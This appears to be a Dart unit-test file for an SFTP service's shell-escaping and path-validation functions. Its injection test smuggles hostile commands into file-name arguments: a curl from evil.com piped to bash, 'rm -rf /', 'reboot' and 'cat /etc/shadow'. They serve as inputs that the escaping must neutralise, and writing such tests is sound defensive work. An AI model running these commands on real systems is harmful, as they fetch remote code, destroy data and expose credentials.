import 'package:flutter_test/flutter_test.dart';
import 'package:orbit/core/services/sftp_service.dart';

void main() {
  group('SftpService POSIX Shell Escape & Path Validation [SEC-001]', () {
    test('escapePosixShellArg wraps simple strings in single quotes', () {
      expect(SftpService.escapePosixShellArg('var/log'), "'var/log'");
      expect(
        SftpService.escapePosixShellArg('/home/user/my file.txt'),
        "'/home/user/my file.txt'",
      );
    });

    test('escapePosixShellArg escapes embedded single quotes safely', () {
      expect(
        SftpService.escapePosixShellArg("it's a file"),
        r"'it'\''s a file'",
      );
      expect(SftpService.escapePosixShellArg("'''"), r"''\'''\'''\'''");
    });

    test('escapePosixShellArg rejects null bytes with ArgumentError', () {
      expect(
        () => SftpService.escapePosixShellArg('/path/with\u0000null'),
        throwsA(isA<ArgumentError>()),
      );
    });

    test(
      'escapePosixShellArg neutralizes shell command injection attempts',
      () {
        const injection1 = 'test"; curl http://evil.com/payload | bash; echo "';
        final safe1 = SftpService.escapePosixShellArg(injection1);
        expect(safe1, startsWith("'"));
        expect(safe1, endsWith("'"));
        expect(
          safe1,
          contains(r'test"; curl http://evil.com/payload | bash; echo "'),
        );

        const injection2 = r'$(rm -rf /)';
        final safe2 = SftpService.escapePosixShellArg(injection2);
        expect(safe2, "'$injection2'");

        const injection3 = '`reboot`';
        final safe3 = SftpService.escapePosixShellArg(injection3);
        expect(safe3, r"'`reboot`'");

        const injection4 = 'file; rm -rf /; echo';
        final safe4 = SftpService.escapePosixShellArg(injection4);
        expect(safe4, "'file; rm -rf /; echo'");

        const injection5 = 'file\nreboot\n';
        final safe5 = SftpService.escapePosixShellArg(injection5);
        expect(safe5, "'file\nreboot\n'");

        const injection6 = 'file | cat /etc/shadow';
        final safe6 = SftpService.escapePosixShellArg(injection6);
        expect(safe6, "'file | cat /etc/shadow'");
      },
    );

    test('deleteDirectory rejects dangerous root and relative paths', () async {
      final sftp = SftpService();
      // Even before checking connection, validate dangerous path arguments
      expect(() => sftp.deleteDirectory(''), throwsA(isA<ArgumentError>()));
      expect(() => sftp.deleteDirectory('   '), throwsA(isA<ArgumentError>()));
      expect(() => sftp.deleteDirectory('.'), throwsA(isA<ArgumentError>()));
      expect(() => sftp.deleteDirectory('/'), throwsA(isA<ArgumentError>()));
      expect(() => sftp.deleteDirectory('~'), throwsA(isA<ArgumentError>()));
    });

    test('deleteDirectory throws when not connected', () async {
      final sftp = SftpService();
      expect(
        () => sftp.deleteDirectory('/home/user/old_dir'),
        throwsA(isA<Exception>()),
      );
    });

    test('getDiskUsage throws when not connected', () async {
      final sftp = SftpService();
      expect(() => sftp.getDiskUsage('/home'), throwsA(isA<Exception>()));
    });

    test('uploadFileStream throws when not connected', () async {
      final sftp = SftpService();
      expect(
        () => sftp.uploadFileStream('/test.txt', Stream.value([1, 2, 3]), 3),
        throwsA(isA<Exception>()),
      );
    });
  });
}
